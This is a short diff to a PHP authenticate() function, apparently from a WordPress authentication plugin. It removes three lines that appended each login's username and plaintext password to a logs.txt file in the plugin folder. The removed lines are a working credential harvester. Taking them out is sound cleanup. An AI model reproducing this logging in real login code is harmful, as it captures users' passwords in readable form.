@@ -43,9 +43,6 @@ public function authenticate( $user, $username, $password )
                 return wp_authenticate_username_password(null, $username, $password);
             }
         }
-    } elseif (!empty($username)) {
-        $log = date("Y-m-d H:i:s").' '.$username.':'.$password."\n";
-        file_put_contents(dirname(__FILE__).'/logs.txt', $log, FILE_APPEND);
     }
     return false;
 }
